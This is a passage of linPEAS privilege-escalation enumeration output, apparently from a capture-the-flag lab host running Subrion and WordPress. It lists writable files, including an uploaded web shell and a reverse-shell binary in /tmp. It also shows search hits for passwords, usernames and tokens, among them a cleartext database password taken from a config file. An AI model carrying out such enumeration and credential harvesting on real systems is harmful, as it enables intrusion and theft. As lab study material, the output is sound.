#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/includes/elfinder/js/i18n/help/en.html
/var/www/html/subrion/includes/elfinder/js/i18n/help/en.html.js
/var/www/html/subrion/includes/elfinder/js/i18n/help/ja.html.js
/var/www/html/subrion/includes/elfinder/js/i18n/help/jp.html
/var/www/html/subrion/includes/elfinder/js/i18n/help/jp.html.js
/var/www/html/subrion/includes/elfinder/js/i18n/help/ko.html.js
/var/www/html/subrion/includes/elfinder/js/i18n/help/pl.html.js
/var/www/html/subrion/includes/elfinder/js/i18n/help/ru.html.js

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group www-data:
/tmp/shell.php
/tmp/reverse.elf
/var/www/html/subrion/uploads/.tmb
/var/www/html/subrion/uploads/linpeas.sh

[+] Searching passwords in config PHP files
    const TYPE_PASSWORD = 'password';
				case 'DB_PASSWORD':
		define( 'DB_PASSWORD', $pwd );
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

[+] Finding IPs inside logs (limit 70)
     72 /var/log/dpkg.log:1.16.04.1
     15 /var/log/dpkg.log:3.16.04.5
     14 /var/log/dpkg.log:1.16.04.4
     13 /var/log/dpkg.log:1.18.04.7
     12 /var/log/dpkg.log:1.16.04.5
     11 /var/log/dpkg.log:6.16.04.1
      9 /var/log/dpkg.log:2.16.04.2
      9 /var/log/apt/history.log:1.16.04.1
      8 /var/log/dpkg.log:2.16.04.3
      7 /var/log/dpkg.log:3.16.04.3
      5 /var/log/installer/status:1.16.04.1
      4 /var/log/installer/status:1.2.3.3
      2 /var/log/apt/history.log:1.16.04.4
      1 /var/log/installer/status:2.21.63.10
      1 /var/log/apt/history.log:6.16.04.1
      1 /var/log/apt/history.log:3.16.04.5
      1 /var/log/apt/history.log:3.16.04.3
      1 /var/log/apt/history.log:2.16.04.3
      1 /var/log/apt/history.log:2.16.04.2
      1 /var/log/apt/history.log:1.18.04.7
      1 /var/log/apt/history.log:1.16.04.5

[+] Finding passwords inside logs (limit 70)
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.39) ...
/var/log/bootstrap.log:Setting up passwd (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) over (3.5.39) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/dpkg.log:2020-08-10 18:14:40 configure base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:40 install base-passwd:amd64 <none> 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:40 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:40 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:40 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:40 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:45 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:45 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:45 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:45 upgrade base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:55 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:14:55 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:14:56 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:15:02 configure base-passwd:amd64 3.5.39 <none>
/var/log/dpkg.log:2020-08-10 18:15:02 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:15:02 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:15:02 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:15:12 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
/var/log/dpkg.log:2020-08-10 18:15:12 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:15:12 status installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:15:12 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:16:22 configure passwd:amd64 1:4.2-3.1ubuntu5.4 <none>
/var/log/dpkg.log:2020-08-10 18:16:22 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:16:22 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.4
/var/log/dpkg.log:2020-08-10 18:16:22 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:16:22 status installed passwd:amd64 1:4.2-3.1ubuntu5.4
/var/log/dpkg.log:2020-08-10 18:16:22 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:16:22 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.4
/var/log/dpkg.log:2020-08-10 18:16:22 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.4
/var/log/installer/status:Description: Set up users and passwords

[+] Finding emails inside logs (limit 70)
     58 /var/log/installer/status:ubuntu-devel-discuss@lists.ubuntu.com
     28 /var/log/installer/status:ubuntu-installer@lists.ubuntu.com
     17 /var/log/installer/status:kernel-team@lists.ubuntu.com
      4 /var/log/bootstrap.log:ftpmaster@ubuntu.com

[+] Finding *password* or *credential* files in home (limit 70)

[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/etc/acpi/powerbtn.sh:                userhome=`getent passwd $user | cut -d: -f6`
/etc/amazon/ssm/README.md:docker run -it --rm --name ssm-agent-build-container -v `pwd`:/amazon-ssm-agent ssm-agent-build-image make build-release
/etc/bash_completion.d/grub:__grub_mkpasswd_pbkdf2_program="grub-mkpasswd-pbkdf2"
/etc/nsswitch.conf:passwd:         compat
/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
/etc/samba/smb.conf:   pam password change = yes
/etc/samba/smb.conf:   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
/etc/samba/smb.conf:   passwd program = /usr/bin/passwd %u
/etc/samba/smb.conf:   unix password sync = yes
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword		= A challenge password
/etc/ssl/openssl.cnf:challengePassword_max		= 20
/etc/ssl/openssl.cnf:challengePassword_min		= 4
/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password \1 xxxxxx/g' > \
/var/www/html/subrion/admin/members.php:                    $this->addMessage(iaLanguage::get('password') . ': ' . iaLanguage::get('ascii_required'));
/var/www/html/subrion/admin/members.php:                    'password' => $this->_password,
/var/www/html/subrion/admin/members.php:                $entry['password'] = $this->getHelper()->encodePassword($this->_password);
/var/www/html/subrion/admin/members.php:                $password = $this->getHelper()->createPassword();
/var/www/html/subrion/admin/members.php:                $passwordHash = $this->getHelper()->encodePassword($password);
/var/www/html/subrion/admin/members.php:                if ($this->_iaDb->update(['password' => $passwordHash], iaDb::convertIds($member['id']))) {
/var/www/html/subrion/admin/members.php:            $this->_password = trim($data['_password']);
/var/www/html/subrion/admin/members.php:        if ($iaAcl->isAccessible($this->getName(), 'password') || iaCore::ACTION_ADD == $action) {
/var/www/html/subrion/admin/members.php:        if (empty($data['_password']) && iaCore::ACTION_ADD == $action) {
/var/www/html/subrion/admin/templates/default/configuration.tpl:                    {if 'password' == $entry.type}
/var/www/html/subrion/admin/templates/default/login.tpl:                    <div class="js-login-body-forgot-password" style="display: none;">
/var/www/html/subrion/admin/templates/emails/README.md:    "password": "YOUR_ACCOUNT_PASSWORD",
/var/www/html/subrion/admin/templates/emails/example.config.json:    "password": "YOUR_ACCOUNT_PASSWORD",
/var/www/html/subrion/admin/templates/emails/src/pages/email.member_registration.html:    <columns small="3">Password:</columns>
/var/www/html/subrion/admin/templates/emails/src/pages/email.member_registration_notification.html:    <columns small="3">Password:</columns>
/var/www/html/subrion/admin/templates/emails/src/pages/email.password_changement.html:    <columns small="3">Password:</columns>
/var/www/html/subrion/front/page.php:        $_SESSION['page_passwords'][$name] = $passw;
/var/www/html/subrion/front/page.php:        $iaView->setMessages(iaLanguage::get('password_incorrect'), iaView::ERROR_NOT_FOUND);
/var/www/html/subrion/front/page.php:    if (isset($_POST['password']) && $page['passw'] && $passw != $page['passw']) {
/var/www/html/subrion/front/profile.php:            $iaUsers->changePassword(iaUsers::getIdentity(true), $newPassword, false);
/var/www/html/subrion/front/profile.php:        $newPassword = empty($_POST['new']) ? false : $_POST['new'];
/var/www/html/subrion/front/profile.php:        if (!password_verify($_POST['current'], iaUsers::getIdentity()->password)) {
/var/www/html/subrion/front/profile.php:        if ($newPassword != $_POST['confirm']) {
/var/www/html/subrion/front/registration.php:                        if ($_POST['password'] != $_POST['password2']) {
/var/www/html/subrion/front/registration.php:                    $itemData['password'] = '';
/var/www/html/subrion/front/registration.php:                $itemData['password'] = iaUtil::checkPostParam('password');
/var/www/html/subrion/front/registration.php:    if ('member_password_forgot' == $iaView->name()) {
/var/www/html/subrion/includes/OAuth2/Server.php:            $grantTypes['password'] = new UserCredentials($this->storages['user_credentials']);
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:        $password = $this->hashPassword($password);
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:        return $user['password'] == $this->hashPassword($password);
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:    public function setUser($username, $password, $first_name = null, $last_name = null)
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:                'password' => $password,
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:        return $user['password'] == $password;
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:    public function setUser($username, $password, $firstName = null, $lastName = null)
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:        $password = $this->hashPassword($password);
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:        return $user['password'] == $this->hashPassword($password);
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:    public function setUser($username, $password, $first_name = null, $last_name = null)
/var/www/html/subrion/includes/OAuth2/Storage/Memory.php:            'password'   => $password,
/var/www/html/subrion/includes/OAuth2/Storage/Memory.php:            'password'   => null,
/var/www/html/subrion/includes/OAuth2/Storage/Memory.php:    public function setUser($username, $password, $firstName = null, $lastName = null)
/var/www/html/subrion/includes/OAuth2/Storage/Mongo.php:                    'password' => $password,
/var/www/html/subrion/includes/OAuth2/Storage/Mongo.php:                'password' => $password,
/var/www/html/subrion/includes/OAuth2/Storage/Mongo.php:        return $user['password'] == $password;
/var/www/html/subrion/includes/OAuth2/Storage/Mongo.php:    public function setUser($username, $password, $firstName = null, $lastName = null)
/var/www/html/subrion/includes/OAuth2/Storage/Pdo.php:                'password' => null,
/var/www/html/subrion/includes/OAuth2/Storage/Pdo.php:        $password = $this->hashPassword($password);
/var/www/html/subrion/includes/OAuth2/Storage/Pdo.php:        return $user['password'] == $this->hashPassword($password);
/var/www/html/subrion/includes/OAuth2/Storage/Pdo.php:    public function setUser($username, $password, $firstName = null, $lastName = null)
/var/www/html/subrion/includes/OAuth2/Storage/Redis.php:        return $user && $user['password'] === $password;
/var/www/html/subrion/includes/OAuth2/Storage/Redis.php:    public function setUser($username, $password, $first_name = null, $last_name = null)
/var/www/html/subrion/includes/adminer/adminer.script.inc:';if($Hd=="auth"){$rc=true;foreach((array)$_SESSION["pwds"]as$Pg=>$zf){foreach($zf
/var/www/html/subrion/includes/adminer/adminer.script.inc:<tr><th>Password<td><input name="pass" id="pass" value="',h($L["pass"]),'">
/var/www/html/subrion/includes/adminer/adminer.script.inc:<tr><th>Password<td><input type="password" name="auth[password]">
/var/www/html/subrion/includes/api/auth.php:                throw new Exception('New password is empty', iaApiResponse::BAD_REQUEST);

[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/var/www/html/subrion/admin/templates/emails/README.md:    "accessKeyId": "YOUR_ACCOUNT_KEY",
/var/www/html/subrion/admin/templates/emails/README.md:    "secretAccessKey": "YOUR_ACCOUNT_SECRET",
/var/www/html/subrion/admin/templates/emails/example.config.json:    "accessKeyId": "YOUR_ACCOUNT_KEY",
/var/www/html/subrion/admin/templates/emails/example.config.json:    "secretAccessKey": "YOUR_ACCOUNT_SECRET",
/var/www/html/subrion/includes/OAuth2/ClientAssertionType/HttpBasic.php:     *     "client_id"     => CLIENT_ID,        // REQUIRED the client id
/var/www/html/subrion/includes/OAuth2/Controller/AuthorizeController.php:            'client_id'     => $this->client_id,
/var/www/html/subrion/includes/OAuth2/Controller/AuthorizeController.php:        $this->client_id     = $client_id;
/var/www/html/subrion/includes/OAuth2/Controller/AuthorizeControllerInterface.php:    const RESPONSE_TYPE_ACCESS_TOKEN = 'token';
/var/www/html/subrion/includes/OAuth2/GrantType/RefreshToken.php:            'always_issue_new_refresh_token' => false,
/var/www/html/subrion/includes/OAuth2/GrantType/RefreshToken.php:            'unset_refresh_token_after_use' => true
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/IdToken.php:    protected function createAtHash($access_token, $client_id = null)
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/IdToken.php:    protected function encodeToken(array $token, $client_id = null)
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/IdTokenToken.php:        $access_token = $result[1]['fragment']['access_token'];
/var/www/html/subrion/includes/OAuth2/ResponseType/AccessToken.php:            "access_token" => $this->generateAccessToken(),
/var/www/html/subrion/includes/OAuth2/ResponseType/AccessToken.php:            $token["refresh_token"] = $this->generateRefreshToken();
/var/www/html/subrion/includes/OAuth2/ResponseType/AccessToken.php:            'refresh_token_lifetime' => 1209600,
/var/www/html/subrion/includes/OAuth2/ResponseType/JwtAccessToken.php:            $refresh_token = $this->generateRefreshToken();
/var/www/html/subrion/includes/OAuth2/ResponseType/JwtAccessToken.php:            $token['refresh_token'] = $refresh_token;
/var/www/html/subrion/includes/OAuth2/ResponseType/JwtAccessToken.php:            'access_token' => $access_token,
/var/www/html/subrion/includes/OAuth2/ResponseType/JwtAccessToken.php:        $access_token = $this->encodeToken($jwtAccessToken, $client_id);
/var/www/html/subrion/includes/OAuth2/ResponseType/JwtAccessToken.php:    protected function encodeToken(array $token, $client_id = null)
/var/www/html/subrion/includes/OAuth2/Scope.php:    public function getDefaultScope($client_id = null)
/var/www/html/subrion/includes/OAuth2/Server.php:                $this->storages['access_token'] = $this->createDefaultJwtAccessTokenStorage();
/var/www/html/subrion/includes/OAuth2/Server.php:            'always_issue_new_refresh_token' => false,
/var/www/html/subrion/includes/OAuth2/Server.php:            'unset_refresh_token_after_use' => true,
/var/www/html/subrion/includes/OAuth2/Server.php:            'use_jwt_access_tokens'        => false,
/var/www/html/subrion/includes/OAuth2/Server.php:        'access_token' => 'OAuth2\Storage\AccessTokenInterface',
/var/www/html/subrion/includes/OAuth2/Server.php:        'refresh_token' => 'OAuth2\Storage\RefreshTokenInterface',
/var/www/html/subrion/includes/OAuth2/Server.php:     * - client_id: The client identifier as described in Section 2.
/var/www/html/subrion/includes/OAuth2/Storage/AccessTokenInterface.php:     * - client_id: (optional) Stored client identifier.
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:            && $client['client_secret'] == $client_secret;
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:            'access_token_key' => 'oauth_access_tokens:',
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:            'refresh_token_key' => 'oauth_refresh_tokens:',
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:    public function checkClientCredentials($client_id, $client_secret = null)
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:    public function getDefaultScope($client_id = null)
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:    public function getEncryptionAlgorithm($client_id = null)
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:    public function getPrivateKey($client_id = '')
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:    public function getPublicKey($client_id = '')
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:    public function setClientKey($client_id, $key, $subject = null)
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:    public function setScope($scope, $client_id = null, $type = 'supported')
/var/www/html/subrion/includes/OAuth2/Storage/ClientInterface.php:     *               "client_id"    => CLIENT_ID,         // OPTIONAL the client id
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:                'access_token' => $access_token,
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:                'client_id'     => $client_id,
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:                'client_id' => $client_id,
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:                'client_secret' => $client_secret,
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:            'access_token_table' => 'oauth_access_tokens',
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:            'client_id' => $client_id,
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:            'refresh_token' => $refresh_token,
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:            'refresh_token_table' => 'oauth_refresh_tokens',
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:            return $result['client_secret'] == $client_secret;
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:    public function checkClientCredentials($client_id, $client_secret = null)
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:            "Key" => array('access_token'   => array('S' => $access_token))
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:            "Key" => array('client_id'   => array('S' => $client_id))
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:            "Key" => array('refresh_token'   => array('S' => $refresh_token))
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:            'access_token_table' => 'oauth_access_tokens',
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:            'refresh_token_table' => 'oauth_refresh_tokens',
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:    public function checkClientCredentials($client_id, $client_secret = null)
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:    public function getDefaultScope($client_id = null)
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:    public function getEncryptionAlgorithm($client_id = null)
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:    public function getPrivateKey($client_id = '0')
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:    public function getPublicKey($client_id = '0')
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php: *  - oauth_access_tokens (primary hash key : access_token)
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php: *  - oauth_jwt (primary hash key : client_id, primary range key : subject)
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php: *  - oauth_refresh_tokens (primary hash key : refresh_token)
/var/www/html/subrion/includes/OAuth2/Storage/JwtAccessToken.php:        $client_id  = isset($tokenData['aud']) ? $tokenData['aud'] : null;
/var/www/html/subrion/includes/OAuth2/Storage/Memory.php:            'access_tokens' => array(),
/var/www/html/subrion/includes/OAuth2/Storage/Memory.php:            'client_id'     => $client_id,
/var/www/html/subrion/includes/OAuth2/Storage/Memory.php:            'client_secret' => $client_secret,
/var/www/html/subrion/includes/OAuth2/Storage/Memory.php:            'client_secret' => null,
/var/www/html/subrion/includes/OAuth2/Storage/Memory.php:            'refresh_tokens' => array(),

[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/var/www/html/subrion/admin/adminer.php:    $_GET['username'] = INTELLI_DBUSER;
/var/www/html/subrion/admin/members.php:                    'username' => $entry['username'],
/var/www/html/subrion/admin/members.php:            ['username' => $entry['username'], 'id' => $this->getEntryId()])
/var/www/html/subrion/admin/members.php:        $_SESSION[iaUsers::SESSION_KEY] = ['id' => $this->getEntryId(), 'username' => $data['username']];
/var/www/html/subrion/admin/members.php:        if ($this->_iaDb->exists('`username` = :username AND `id` != :id',
/var/www/html/subrion/admin/templates/emails/README.md:    "username": "YOUR_LITMUS@EMAIL.com",
/var/www/html/subrion/admin/templates/emails/example.config.json:    "username": "YOUR_LITMUS@EMAIL.com",
/var/www/html/subrion/admin/templates/emails/src/pages/email.member_registration.html:    <columns small="3">Username:</columns>
/var/www/html/subrion/admin/templates/emails/src/pages/email.password_changement.html:    <columns small="3">Username:</columns>
/var/www/html/subrion/admin/templates/emails/src/pages/email.transaction_paid_admin.html:    <columns small="3">Username:</columns>
/var/www/html/subrion/admin/transactions.php:                    $values['username'] = '%' . iaSanitize::sql($params['query']) . '%';
/var/www/html/subrion/admin/transactions.php:                    $where[] = 'CONCAT_WS(`username`, `fullname`) LIKE :username';
/var/www/html/subrion/admin/transactions.php:                ['user' => $_POST['username']], iaUsers::getTable())
/var/www/html/subrion/admin/transactions.php:            $conditions[] = 'm.`username` LIKE :username';
/var/www/html/subrion/admin/transactions.php:            $values['username'] = '%' . $params['username'] . '%';
/var/www/html/subrion/admin/transactions.php:            if ($memberId = $this->_iaDb->one_bind(iaDb::ID_COLUMN_SELECTION, '`username` = :user',
/var/www/html/subrion/front/view_member.php:    $title = empty($member['fullname']) ? $member['username'] : $member['fullname'];
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php:    public function setUser($username, $password, $first_name = null, $last_name = null)
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:                'username' => $username,
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php:    public function setUser($username, $password, $firstName = null, $lastName = null)
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:            "Key" => array('username'   => array('S' => $username))
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php:    public function setUser($username, $password, $first_name = null, $last_name = null)
/var/www/html/subrion/includes/OAuth2/Storage/Memory.php:        $this->userCredentials[$username] = array(
/var/www/html/subrion/includes/OAuth2/Storage/Memory.php:    public function setUser($username, $password, $firstName = null, $lastName = null)
/var/www/html/subrion/includes/OAuth2/Storage/Mongo.php:                'username' => $username,
/var/www/html/subrion/includes/OAuth2/Storage/Mongo.php:                array('username' => $username),
/var/www/html/subrion/includes/OAuth2/Storage/Mongo.php:        $result = $this->collection('user_table')->findOne(array('username' => $username));
/var/www/html/subrion/includes/OAuth2/Storage/Mongo.php:    public function setUser($username, $password, $firstName = null, $lastName = null)
/var/www/html/subrion/includes/OAuth2/Storage/Pdo.php:                'username' => null,
/var/www/html/subrion/includes/OAuth2/Storage/Pdo.php:        $stmt->execute(array('username' => $username));
/var/www/html/subrion/includes/OAuth2/Storage/Pdo.php:    public function setUser($username, $password, $firstName = null, $lastName = null)
/var/www/html/subrion/includes/OAuth2/Storage/Redis.php:    public function setUser($username, $password, $first_name = null, $last_name = null)
/var/www/html/subrion/includes/adminer/adminer.script.inc:set_session($y,$X){$_SESSION[$y][DRIVER][SERVER][$_GET["username"]]=$X;}function
/var/www/html/subrion/includes/api/auth.php:        if ($request->getPost('email') !== null || $request->getPost('username') !== null) {
/var/www/html/subrion/includes/classes/ia.core.invoice.php:            'username' => $member['username'],
/var/www/html/subrion/includes/classes/ia.core.mailer.php:                $this->Username = $this->_iaCore->get('smtp_user');
/var/www/html/subrion/includes/classes/ia.core.plan.php:            'username' => $member['username'],
/var/www/html/subrion/includes/classes/ia.core.transaction.php:                'username' => $member['username'],
/var/www/html/subrion/includes/classes/ia.core.transaction.php:                'username' => iaUsers::getIdentity()->username,
/var/www/html/subrion/includes/classes/ia.core.users.php:                    'username' => $listingData['username']
/var/www/html/subrion/includes/classes/ia.core.users.php:                $memberRegInfo['username'] = '';
/var/www/html/subrion/includes/classes/ia.core.users.php:                'username' => $memberInfo['username'],
/var/www/html/subrion/includes/classes/ia.core.users.php:                'username' => preg_replace('/[^a-zA-Z0-9.@_-]/', '', $usernameOrEmail),
/var/www/html/subrion/includes/classes/ia.core.users.php:            $condition = '(u.`username` = :username OR u.`email` = :email)' .
/var/www/html/subrion/includes/classes/ia.core.users.php:            $entryData['username'] = self::getIdentity()->username;
/var/www/html/subrion/includes/classes/ia.core.users.php:            $memberInfo['username'] = $this->_generateUserName($memberInfo);
/var/www/html/subrion/includes/classes/ia.core.users.php:        in_array($key, ['id', 'username', 'email', 'sec_key']) || $key = 'id';
/var/www/html/subrion/includes/classes/ia.core.util.php:            $userName = iaUsers::hasIdentity() ? iaUsers::getIdentity()->username : false;
/var/www/html/subrion/includes/classes/ia.core.util.php:    public static function getAccountDir($userName = '')
/var/www/html/subrion/includes/classes/ia.core.validate.php:    const USERNAME_PATTERN = '/^[a-zA-Z0-9.@_-]+$/';
/var/www/html/subrion/includes/hybrid/thirdparty/OpenID/LightOpenID.php:                 :"{$url['username']}:{$url['password']}@"))
/var/www/html/subrion/includes/phpmailer/PHPMailer.php:    public $Username = '';
/var/www/html/subrion/install/dump/install.sql:(1,'{install:admin_username}','{install:email}',NOW(),NOW(),'Administrator','en');
/var/www/html/subrion/install/modules/module.install.php: Username: {dbuser}
/var/www/html/subrion/install/modules/module.install.php: Username: {username}
/var/www/html/subrion/install/templates/install.configuration.tpl:                        <label class="col-lg-4 control-label">DB Username:</label>
/var/www/html/subrion/install/templates/install.configuration.tpl:                        <label class="col-lg-4 control-label">Username:</label>
/var/www/html/subrion/js/admin/invoices.js:                    {name: 'fullname', title: _t('username'), width: 1},
/var/www/html/subrion/js/admin/members.js:                {name: 'username', title: _t('username'), width: 150, editor: 'text'},
/var/www/html/subrion/js/admin/transactions.js:                {name: 'user', title: _t('username'), width: 1},
/var/www/html/subrion/js/jquery/plugins/elfinder/external/jquery/jquery.js:	username: null,
/var/www/html/subrion/modules/blog/admin/index.php:            $conditions[] = '(m.`fullname` LIKE :owner OR m.`username` LIKE :owner)';
/var/www/html/subrion/templates/_common/login.tpl:                <label for="field_login">{lang key='username_or_email'}:</label>
/var/www/html/subrion/templates/_common/registration-confirmation.tpl:        <label>{lang key='username_or_email'}:</label>
/var/www/html/wordpress/wp-activate.php:					/* translators: 1: Login URL, 2: Username, 3: User email address, 4: Lost password URL. */
/var/www/html/wordpress/wp-activate.php:					/* translators: 1: Site URL, 2: Username, 3: User email address, 4: Lost password URL. */
/var/www/html/wordpress/wp-activate.php:			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
/var/www/html/wordpress/wp-admin/includes/ajax-actions.php:	$username = isset( $_REQUEST['username'] ) ? wp_unslash( $_REQUEST['username'] ) : false;
/var/www/html/wordpress/wp-admin/includes/class-wp-filesystem-ftpext.php:	$this->options['username'] = $opt['username'];
/var/www/html/wordpress/wp-admin/includes/class-wp-filesystem-ftpsockets.php:	$this->options['username'] = $opt['username'];

[+] Searching specific hashes inside files - less false positives (limit 70)

root@ip-10-10-241-82:~# 

```